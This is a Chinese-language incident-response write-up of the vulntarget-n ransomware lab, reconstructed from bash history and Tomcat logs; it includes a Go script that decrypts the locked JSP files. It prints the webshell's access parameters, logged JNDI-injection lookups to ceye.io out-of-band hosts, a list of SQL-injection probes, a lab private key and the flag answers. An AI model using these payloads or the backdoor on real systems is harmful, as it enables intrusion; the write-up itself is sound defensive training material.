---
created: 2026-02-15
modified: 2026-02-15
tags:
---

```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

# 概述

![[vulntarget-n-勒索病毒应急靶场-260215-154557.png]]

![[vulntarget-n-勒索病毒应急靶场-260215-154605.png]]

# 本地部署

给的是一个 `raw` 格式的镜像，我们用 `qemu-img` 转换为 `wmware` 支持的 `wmdk` 虚拟磁盘。

```bash
qemu-img convert -f raw -O vmdk .\vuln_m-j6cegcrhehdcba0r5h4v_system.raw vuln_n.vmdk
```

在「新建虚拟机向导」这选择「使用现有虚拟磁盘」

![[vulntarget-n-勒索病毒应急靶场-260215-154844.png]]

新建成功后用 `ssh` 连接

![[vulntarget-n-勒索病毒应急靶场-260215-155122.png]]

# 分析

## 1 观察

看一下监听的端口，发现 `80` `8009` 和 `8005` 端口运行这 `java` 程序

![[vulntarget-n-勒索病毒应急靶场-260215-160618.png]]

访问一下 `80` 端口，会发现果然出现了勒索的提示

![[vulntarget-n-勒索病毒应急靶场-260215-160641.png]]

## 2 导出并处理命令历史

我们用 `history` 命令导出命令历史，会发现 `111` 行前面的部分有两列行号，而后面的部分只有一列行号；这是因为第 `111` 行执行了 `history > .bash_history` 手动把 `history` 输出的带行号的结果保存到 `.bash_history` 这一不带行号保存命令历史的文件中了，而 `111` 行后面的才是自动保存的历史 (在文件中是没有行号的，只是 `history` 命令输出时会自动加上行号)；而且 `111` 前面和后面的命令是重复的。

![[vulntarget-n-勒索病毒应急靶场-260215-161655.png]]

这里我们把重复的部分处理一下，并重新标号如下：

```bash
001  apt update && apt install openjdk-8-jdk && apt install unzip -y
002  vim /etc/profile
003  source /etc/profile
004  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip
005  unzip apache-tomcat-7.0.79.zip
006  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat
007  mv apache-tomcat-7.0.79 /opt/tomcat
008  chmod +x /opt/tomcat/bin/*.sh
009  ls
010  history
011  flag{vulntarget_very_G00d}
012  /opt/tomcat/bin/startup.sh
013  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak
014  vim /opt/tomcat/conf/server.xml
015  ps -axu | grep tomcat
016  kill -9 6961
017  /opt/tomcat/bin/startup.sh
018  cp web.xml web.xml.bak
019  pwd
020  cd ..
021  ls
022  cd /opt/
023  ls
024  cd tomcat/
025  ls
026  cd conf/
027  cp web.xml web.xml.bak
028  vim web.xml
029  ps -axu | grep tomcat
030  kill -9 7409
031  /opt/tomcat/bin/startup.sh
032  pwd
033  cd ..
034  ls
035  cd webapps/
036  ls
037  cd ROOT/
038  ls
039  rm favicon.ico
040  cp index.jsp index.jsp.bak
041  ls
042  vim index.jsp
043  rm index.jsp
044  vim index.jsp
045  crontab -e
046  history
047  ls
048  mv vulntargetn.jsp 404.jsp
049  ls
050  rm index.jsp.bak
051  pip3 install rsa
052  ls
053  ls -lha
054  mkdir .vulntarget
055  cd .vulntarget/
056  ls
057  mkdir keys
058  ls
059  history
060  ls
061  vim get_pem.py
062  python3 get_pem.py
063  ls
064  rm get_pem.py
065  ls
066  cd ..
067  ls
068  cp .vulntarget/keys/pubkey.pem .
069  ls
070  ls | grep jsp
071  vim encrypt_vulntarget.py
072  ls
073  vim flag.jsp
074  ls | grep jsp
075  python3 encrypt_vulntarget.py
076  ls
077  cd .vulntarget/
078  ls
079  cd keys/
080  ls
081  cat pubkey.pem
082  cat privkey.pem
083  cd ..
084  ls
085  cd ..
086  ls
087  rm encrypt_vulntarget.py
088  rm pubkey.pem
089  ls
090  vim index.jsp
091  ls
092  cd ..
093  ls
094  cd ..
095  ls
096  cd logs/
097  ls
098  cat localhost_access_log.2024-06-04.txt
099  vim localhost_access_log.2024-06-04.txt
100  ls
101  vim localhost_access_log.2024-06-04.txt
102  ls
103  history
104  curl http://127.0.0.1
105  ls
106  cd
107  ls
108  ls -lha
109  cat .bashrc
110  ls
111  history > .bash_history
112  history
113  exit
```

## 3 分析命令历史

前面是部署 `tomcat` 的过程，在第 `11` 行找到第一个 `flag`

```bash
001  apt update && apt install openjdk-8-jdk && apt install unzip -y
002  vim /etc/profile
003  source /etc/profile
004  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip
005  unzip apache-tomcat-7.0.79.zip
006  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat
007  mv apache-tomcat-7.0.79 /opt/tomcat
008  chmod +x /opt/tomcat/bin/*.sh
009  ls
010  history
011  flag{vulntarget_very_G00d}
```

```flag1
flag{vulntarget_very_G00d}
```

下面 `12` 行先启动了 `tomcat`，然后又改了一下 `server.xml`(`13~14`)，改完后关掉原本的进程又重开了一遍 (`15~17`)。

```bash
012  /opt/tomcat/bin/startup.sh
013  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak
014  vim /opt/tomcat/conf/server.xml
015  ps -axu | grep tomcat
016  kill -9 6961
017  /opt/tomcat/bin/startup.sh
```

看了一下 `server.xml` 文件的变化，只是改了一下端口 `8080 -> 80`，也是部署阶段的事情。

![[vulntarget-n-勒索病毒应急靶场-260215-164312.png]]

第 `18~32` 行是改 `web.xml` 并重启 `tomcat` 的逻辑

```bash
018  cp web.xml web.xml.bak
019  pwd
020  cd ..
021  ls
022  cd /opt/
023  ls
024  cd tomcat/
025  ls
026  cd conf/
027  cp web.xml web.xml.bak
028  vim web.xml
029  ps -axu | grep tomcat
030  kill -9 7409
031  /opt/tomcat/bin/startup.sh
```

看了一下 `diff`，只是加了一个 `readonly=false` 参数，应该也是部署阶段

![[vulntarget-n-勒索病毒应急靶场-260215-170106.png]]

这部分修改了 `index.jsp`(并且备份了 `index.jsp.bak`)，最后第 `45` 行加了一个计划任务，在重启时自动启动 `tomcat`，因此我倾向与这部分也是部署阶段执行的。 ``

```bash
032  pwd
033  cd ..
034  ls
035  cd webapps/
036  ls
037  cd ROOT/
038  ls
039  rm favicon.ico
040  cp index.jsp index.jsp.bak
041  ls
042  vim index.jsp
043  rm index.jsp
044  vim index.jsp
045  crontab -e
```

![[vulntarget-n-勒索病毒应急靶场-260215-171603.png]]

第 `48~50` 行，用 `vulntargetn.jsp` 覆盖了 `404.jsp`，并删除了 `index.jsp.bak` 备份；暂时不知道是谁操作的，后续再判断。

```bash
048  mv vulntargetn.jsp 404.jsp
049  ls
050  rm index.jsp.bak
```

下面的命令，在 `/opt/tomcat/webapps/ROOT/.vulntarget/keys` 目录下生成了公钥和私钥，并删除了生成脚本；明显是黑客执行的。

```bash
051  pip3 install rsa
052  ls
053  ls -lha
054  mkdir .vulntarget
055  cd .vulntarget/
056  ls
057  mkdir keys
058  ls
059  history
060  ls
061  vim get_pem.py
062  python3 get_pem.py
063  ls
064  rm get_pem.py
```

下面的命令，将 `/opt/tomcat/webapps/ROOT/.vulntarget/keys` 下的公钥移动到 `/opt/tomcat/webapps/ROOT` 目录，并执行了加密脚本加密 `.jsp` 文件，然后删除加密脚本和当前目录下的公钥，最后编辑 `index.jsp` 为勒索页面。

```bash
066  cd ..
067  ls
068  cp .vulntarget/keys/pubkey.pem .
069  ls
070  ls | grep jsp
071  vim encrypt_vulntarget.py
072  ls
073  vim flag.jsp
074  ls | grep jsp
075  python3 encrypt_vulntarget.py
076  ls
077  cd .vulntarget/
078  ls
079  cd keys/
080  ls
081  cat pubkey.pem
082  cat privkey.pem
083  cd ..
084  ls
085  cd ..
086  ls
087  rm encrypt_vulntarget.py
088  rm pubkey.pem
089  ls
090  vim index.jsp
```

很明显 `/opt/tomcat/webapps/ROOT/.vulntarget/keys` 目录下的公私钥没有被删除，我们提取出来，可以看到是 `rsa` 的公私钥：

```pem
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAIaYji+aQIwYWR9sH8ULSWZEvclf1Zpk97yhvJOqF5E6khnG+1e0v08U
ix9aEoecWPv/INFprInqxXMTDxkr1+PPrg3g2+N/nxfqtUobcliKwALjqnvF3y6X
m4KMwOwX5PN41/8MSh7yZm1olDPWlZKqtpBGkNaZbvbby27iEqfxAgMBAAE=
-----END RSA PUBLIC KEY-----
```

```pem
-----BEGIN RSA PRIVATE KEY-----
MIICXwIBAAKBgQCGmI4vmkCMGFkfbB/FC0lmRL3JX9WaZPe8obyTqheROpIZxvtX
tL9PFIsfWhKHnFj7/yDRaayJ6sVzEw8ZK9fjz64N4Nvjf58X6rVKG3JYisAC46p7
xd8ul5uCjMDsF+TzeNf/DEoe8mZtaJQz1pWSqraQRpDWmW7228tu4hKn8QIDAQAB
AoGANLacwTH1Y6jJhs/u5VoVRhNYDP0WiCBREjR5yY9NKZi5zZSrrV7hqhQOpJm/
NhNaml8COGHdrCohaH8nJbHDDdPXxuHltnHrERGSIaybOYRlFUfxM3/qdQjgYocp
mK1Drodb3MuW1Ef0sypD5olvsmNV8ldRNOxX2B+pc9XN/tECRQCeJOdsX/da6BxV
7hYm3u5l7PrJviZg4AvUuIWDqr7SqsTrQGEO9jga8erJ3mm1xIJvRva+K9ebTrc1
K6xVR6hAEc9O5QI9ANnhc+CfSyi2fmOMh2pKPlx2G+wsu2/teeAoY8ZH62+0ofsy
Gg0u2/ZkNbahKNzYfXR5EaI7NiXNERhYHQJEeL6Ii7CB9cC+0cUk2KzhrKTRnnM2
bkTiA5qXJj6Zz9Ne4peXA4turvQCZfsRDx1o0XmHLw/eYNArBcfAnqRFjBWNCRkC
PBbLBxxQjcRMkxxG70OnUK7LjFBAvbsP1NgmYYm0rGSbOPbWXvNSG6DDCvt4EJZJ
75XntHiMSTXbJhat4QJEXYXYwPJ9hz1LP07IyWw1rzhJgc+zC87YRWi78j3UzW21
RgTBq/ALT2JH2ACGh21kW6Cl9T2GC7Ro3YUgRFJjRJcAcsM=
-----END RSA PRIVATE KEY-----
```

## 4 解密被加密的文件

写个脚本用私钥恢复一下 `.vulntarget` 结尾的被加密的文件，这里试出来它用的是 `pkcs1v15`

```go
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/samber/lo"
)

func main() {
	const suffix = ".vulntarget"
	privKeyPem := lo.Must(os.ReadFile("./privkey.pem"))

	files := lo.Must(os.ReadDir("./"))
	for _, file := range files {
		if fileName := file.Name(); strings.HasSuffix(fileName, suffix) {
			fmt.Println("解密", fileName)

			cipherText := lo.Must(base64.StdEncoding.DecodeString(
				string(lo.Must(os.ReadFile(fileName)))))

			res, err := decryptRsa(privKeyPem, cipherText)
			if err != nil {
				fmt.Printf("解密 %s 失败, %s\n\n", fileName, err.Error())
				continue
			}
			fmt.Printf("解密 %s 成功\n\n", fileName)

			lo.Must0(
				os.WriteFile(strings.TrimSuffix(fileName, suffix), res, 0600))
		}
	}
}

func decryptRsa(privKeyPem []byte, cipherText []byte) ([]byte, error) {
	block, _ := pem.Decode(privKeyPem)
	if block == nil {
		return nil, errors.New("解码 pem 文件错误")
	}

	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("解析私钥错误 %w", err)
	}

	modSize := privKey.Size()
	if len(cipherText) < modSize || len(cipherText)%modSize != 0 {
		return nil, errors.New("密文长度不对")
	}

	var res bytes.Buffer
	for i := 0; i < len(cipherText); i += modSize {
		cipherBlock := cipherText[i : i+modSize]

		resBlock, err := rsa.DecryptPKCS1v15(rand.Reader, privKey, cipherBlock)
		if err != nil {
			return nil, fmt.Errorf("rsa 解密错误 %w", err)
		}
		res.Write(resBlock)
	}
	return res.Bytes(), nil
}
```

![[vulntarget-n-勒索病毒应急靶场-260215-193237.png]]

在解密出的 `flag.jsp` 中找到第二个 `flag`

![[vulntarget-n-勒索病毒应急靶场-260215-193432.png]]

```flag2
flag{https://github.com/crow821/vulntarget}
```

把解密后的文件拷贝会服务器，会看到首页恢复了

![[vulntarget-n-勒索病毒应急靶场-260215-194019.png]]

另外可以看到 `404.jsp` 里面是后门，用于 `rce`，只需 `pwd=vulntarget&i=<系统命令>` 即可；而这个 `404.jsp` 在 `history` 历史记录中是由 `vulntarget.jsp` 覆盖的。

![[vulntarget-n-勒索病毒应急靶场-260215-194614.png]]

## 5 分析日志

所以我们去日志中定位到 `vulntarget.jsp` 这个文件，然后很容易看到一开始 `GET` 访问的还是正常的 `vulntarget.jsp` 文件，后来用 `PUT` 方法更新了这个文件，后门应该就是这个 `PUT` 请求时写入的。

![[vulntarget-n-勒索病毒应急靶场-260215-200202.png]]

`history` 中有编辑日志文件的历史，可以推测能在日志中找到第三个 `flag`

```bash
096  cd logs/
097  ls
098  cat localhost_access_log.2024-06-04.txt
099  vim localhost_access_log.2024-06-04.txt
100  ls
101  vim localhost_access_log.2024-06-04.txt
```

在日志中搜索 `flag` 字样，找到第三个 `flag`；而且这玩意单独占一行，一看就是手动加上去的，而不是正常的日志记录。

![[vulntarget-n-勒索病毒应急靶场-260215-200819.png]]

```flag3
flag{Welcome_t0_join_Us}
```

按照之前读到的后门的访问方式 `pwd=vulntarget`，筛选出攻击者执行的命令

```bash
cat localhost_access_log.2024-06-04.txt | awk -F '&' '/pwd=vulntarget/{print $2}' | awk -F ' |i=' '{print $2}' > cmd.txt
```

再把结果 `url` 解码后，得到结果如下，就是一堆自动探测的命令；本题作者说明了他把反弹 `shell` 的逻辑删了，实际应该会有反弹 `shell` 的命令的。

```
whoami
${:-y$}{${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://log48.218.1717482894432.QXwX.u0eeui.ceye.io/a}
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
${url:UTF-8:http://text48.218.1717482938877.fwDm.u0eeui.ceye.io/allbp}
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami
whoami'
whoami
whoami"
whoami
whoami\
whoami
whoami'and/**/extractvalue(1,concat(char(126),md5(1836161162)))and'
whoami
whoami"and/**/extractvalue(1,concat(char(126),md5(1836161162)))and"
whoami
whoami/**/and/**/extractvalue(1,concat(char(126),md5(1836161162)))
whoami
whoami
whoami and sleep(5)
whoami
whoami'and sleep(5) and '1
whoami
whoami"and sleep(5) and "1
whoami
whoami/**/and(select*from(select+sleep(5)union/**/select+1)a)
whoami
whoami'and(select*from(select/**/sleep(5))a/**/union/**/select+1)='
whoami
whoami"and(select*from(select/**/sleep(5))a/**/union/**/select+1)="
whoami
whoami/**/and(select/**/1/**/from/**/pg_sleep(5))>0/**/
whoami
whoami'/**/and(select'1'from/**/pg_sleep(5))::text>'0
whoami
whoami"/**/and(select"1"from/**/pg_sleep(5))::text>"0
whoami
whoami/**/and(select/**/1)>0/**/waitfor/**/delay'0:0:5'/**/
whoami
whoami'and(select/**/1)>0/**/waitfor/**/delay'0:0:5
whoami
whoami"and(select/**/1)>0/**/waitfor/**/delay"0:0:5
whoami
whoami/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE('q',5)
whoami
whoami'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',5)='h
whoami
whoami"/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE("h",5)="h
```

## 6 攻击画像

1. 攻击者通过 `PUT` 方法覆盖了 `/vulntarget.jsp`，里面是 `jsp` 的 `webshell`
2. 通过 `webshell` 反弹 `shell` 并拿到 `root` 权限
3. 生成 `rsa` 的公钥私钥放在 `/opt/tomcat/webapps/ROOT/.vulntarget/keys` 并且忘记删除了
4. 用生成的 `rsa` 公钥加密 `/opt/tomcat/webapps/ROOT` 目录下的 `.jsp` 文件
5. 替换 `index.jsp` 为勒索界面
